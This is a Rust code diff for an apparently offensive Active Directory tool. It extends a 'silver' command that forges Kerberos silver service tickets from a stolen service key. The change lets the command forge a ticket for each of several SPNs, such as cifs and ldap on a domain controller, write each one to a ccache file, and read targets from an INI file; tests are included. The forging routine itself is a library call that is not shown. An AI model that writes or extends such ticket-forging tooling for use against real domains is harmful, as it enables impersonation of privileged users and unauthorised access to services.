@@ -25,9 +25,12 @@ pub(crate) struct SilverArgs {
     /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
     #[arg(long)]
     pub rc4: bool,
-    /// Target SPN (e.g. cifs/dc01.corp.local).
-    #[arg(long)]
-    pub spn: Option<String>,
+    /// Target SPN(s) — one or more, comma-separated
+    /// (e.g. `cifs/dc01.corp.local,http/dc01.corp.local`). When multiple
+    /// SPNs are given AND `--out <path>` is set, each ticket lands at
+    /// `<path>.<spn-slug>.ccache`; a single SPN keeps the old `<path>` behaviour.
+    #[arg(long, value_delimiter = ',')]
+    pub spn: Vec<String>,
     /// Domain SID (S-1-5-21-a-b-c).
     #[arg(long)]
     pub domain_sid: Option<String>,
@@ -109,31 +112,64 @@ async fn silver_impl(cfg: SilverConfig, checklist: &mut ui::StageChecklist) -> R
         group_rids: cfg.groups.clone(),
         domain_subauths: subs,
         logon_server: cfg.realm.split('.').next().unwrap_or("DC").to_uppercase(),
-        logon_domain: cfg.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
+        logon_domain: cfg
+            .realm
+            .split('.')
+            .next()
+            .unwrap_or("DOMAIN")
+            .to_uppercase(),
         extra_sids: vec![],
     };
-    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &cfg.realm, &key, &cfg.spn, cfg.rc4)?;
+    // Stream 7 / silver-multi-SPN: loop the forge per SPN. Same key, same identity —
+    // one call to forge_silver_tgt per SPN. `--out <path>` writes `<path>` for the
+    // first SPN when only one is given (backwards compatibility) and `<path>.<slug>.ccache`
+    // when multiple are given so scripts can pick the SPN they want.
+    let mut forged = 0usize;
+    let mut ccaches = 0usize;
+    let multi = cfg.spns.len() > 1;
+    for (i, spn) in cfg.spns.iter().enumerate() {
+        let tgt = adhammer_kerberos::forge_silver_tgt(&id, &cfg.realm, &key, spn, cfg.rc4)?;
+        forged += 1;
+        println!(
+            "[+] forged silver ticket: {}@{} for {} (rid {})",
+            cfg.user, cfg.realm, spn, cfg.rid
+        );
+        if let Some(base) = &cfg.out {
+            let cc = adhammer_kerberos::silver_ccache(&tgt, &cfg.user, spn)?;
+            let path = if multi {
+                format!("{base}.{}.ccache", spn_slug(spn))
+            } else {
+                base.clone()
+            };
+            adhammer_core::write_secret_artifact(
+                std::path::Path::new(&path),
+                adhammer_core::SecretArtifact::Ccache,
+                &cc,
+            )?;
+            println!("[+] wrote ccache → {path} ({} bytes)", cc.len());
+            ccaches += 1;
+        }
+        let _ = i;
+    }
     checklist.record_ok(
         "forge silver TGS",
-        format!("{}@{} for {} (rid {})", cfg.user, cfg.realm, cfg.spn, cfg.rid),
+        format!("{}@{} for {} SPN(s)", cfg.user, cfg.realm, forged),
     );
-    println!(
-        "[+] forged silver ticket: {}@{} for {} (rid {})",
-        cfg.user, cfg.realm, cfg.spn, cfg.rid
+    checklist.record_ok(
+        "write ccache",
+        if cfg.out.is_some() {
+            format!("{ccaches} ccache(s) written")
+        } else {
+            "skipped (no --out)".to_string()
+        },
     );
-    if let Some(out) = &cfg.out {
-        let cc = adhammer_kerberos::silver_ccache(&tgt, &cfg.user, &cfg.spn)?;
-        adhammer_core::write_secret_artifact(
-            std::path::Path::new(out),
-            adhammer_core::SecretArtifact::Ccache,
-            &cc,
-        )?;
-        checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
-        println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
-    } else {
-        checklist.record_ok("write ccache", "skipped (no --out)");
-    }
     Ok(())
+}
+
+/// Slug an SPN so `cifs/dc.corp.local` becomes `cifs-dc.corp.local` — safe for a
+/// filename, still readable, one-to-one with the SPN.
+fn spn_slug(spn: &str) -> String {
+    spn.replace(['/', '\\', ':'], "-")
 }
 
 #[derive(Debug)]
@@ -141,7 +177,7 @@ struct SilverConfig {
     realm: String,
     service_aes256: adhammer_core::SecretString,
     rc4: bool,
-    spn: String,
+    spns: Vec<String>,
     domain_sid: String,
     user: String,
     rid: u32,
@@ -155,6 +191,9 @@ impl SilverConfig {
             Some(k) => crate::resolve_secret(k, "ADHAMMER_PASSWORD")?,
             None => anyhow::bail!("--service-aes256 required (or use --from-file)"),
         };
+        if a.spn.is_empty() {
+            anyhow::bail!("--spn required (or use --from-file)");
+        }
         Ok(Self {
             realm: a
                 .realm
@@ -162,10 +201,7 @@ impl SilverConfig {
                 .ok_or_else(|| anyhow::anyhow!("--realm required (or use --from-file)"))?,
             service_aes256,
             rc4: a.rc4,
-            spn: a
-                .spn
-                .clone()
-                .ok_or_else(|| anyhow::anyhow!("--spn required (or use --from-file)"))?,
+            spns: a.spn.clone(),
             domain_sid: a
                 .domain_sid
                 .clone()
@@ -204,11 +240,26 @@ impl SilverFile {
                 anyhow::anyhow!("service_aes256 missing in both --from-file and CLI flags")
             })?;
         let service_aes256 = crate::resolve_secret(key_raw.as_str(), "ADHAMMER_PASSWORD")?;
+        // silver-multi-SPN: CLI --spn wins if non-empty, otherwise the INI `spn`
+        // key is comma-split. Same grammar either way.
+        let spns: Vec<String> = if !a.spn.is_empty() {
+            a.spn.clone()
+        } else {
+            self.spn
+                .ok_or_else(|| anyhow::anyhow!("spn missing in both --from-file and CLI flags"))?
+                .split(',')
+                .map(|s| s.trim().to_string())
+                .filter(|s| !s.is_empty())
+                .collect()
+        };
+        if spns.is_empty() {
+            anyhow::bail!("spn resolved to empty list");
+        }
         Ok(SilverConfig {
             realm: take(self.realm, a.realm.clone(), "realm")?,
             service_aes256,
             rc4: a.rc4 || self.rc4.unwrap_or(false),
-            spn: take(self.spn, a.spn.clone(), "spn")?,
+            spns,
             domain_sid: take(self.domain_sid, a.domain_sid.clone(), "domain_sid")?,
             user: a.user.clone(),
             rid: a.rid,
@@ -241,9 +292,10 @@ fn load_silver_ini(path: &str) -> Result<SilverFile> {
             "realm" => f.realm = Some(v),
             "service_aes256" => f.service_aes256 = Some(v),
             "rc4" => {
-                f.rc4 = Some(v.parse::<bool>().map_err(|_| {
-                    anyhow::anyhow!("{path}:{}: rc4 must be true|false", n + 1)
-                })?);
+                f.rc4 =
+                    Some(v.parse::<bool>().map_err(|_| {
+                        anyhow::anyhow!("{path}:{}: rc4 must be true|false", n + 1)
+                    })?);
             }
             "spn" => f.spn = Some(v),
             "domain_sid" => f.domain_sid = Some(v),
@@ -278,7 +330,7 @@ mod tests {
             realm: None,
             service_aes256: None,
             rc4: false,
-            spn: None,
+            spn: vec![],
             domain_sid: None,
             user: "Administrator".to_string(),
             rid: 500,
@@ -327,11 +379,39 @@ mod tests {
         );
         let f = load_silver_ini(&path).unwrap();
         let mut a = empty_args();
-        a.spn = Some("cli/spn".to_string());
+        a.spn = vec!["cli/spn".to_string()];
         let cfg = f.overlay(&a).unwrap();
-        assert_eq!(cfg.spn, "cli/spn");
+        assert_eq!(cfg.spns, vec!["cli/spn".to_string()]);
         assert_eq!(cfg.realm, "INI.LOCAL");
         let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn multi_spn_from_ini_comma_split() {
+        // Stream 7 / silver-multi-SPN: INI `spn=` accepts a comma-separated list and
+        // yields multiple ccache targets. Regression guard: the loop must forge one
+        // ticket per SPN, not concatenate them into a single principal name.
+        let path = tmp_ini(
+            "multi",
+            "realm=CORP.LOCAL\n\
+             service_aes256=aa\n\
+             spn=cifs/dc01.corp.local,http/dc01.corp.local,ldap/dc01.corp.local\n\
+             domain_sid=S-1-5-21-1-2-3\n",
+        );
+        let f = load_silver_ini(&path).unwrap();
+        let a = empty_args();
+        let cfg = f.overlay(&a).unwrap();
+        assert_eq!(cfg.spns.len(), 3);
+        assert_eq!(cfg.spns[0], "cifs/dc01.corp.local");
+        assert_eq!(cfg.spns[2], "ldap/dc01.corp.local");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn spn_slug_strips_forbidden_filename_chars() {
+        assert_eq!(spn_slug("cifs/dc01.corp.local"), "cifs-dc01.corp.local");
+        assert_eq!(spn_slug("http/dc01"), "http-dc01");
+        assert_eq!(spn_slug("mssql:host"), "mssql-host");
     }
 
     #[test]
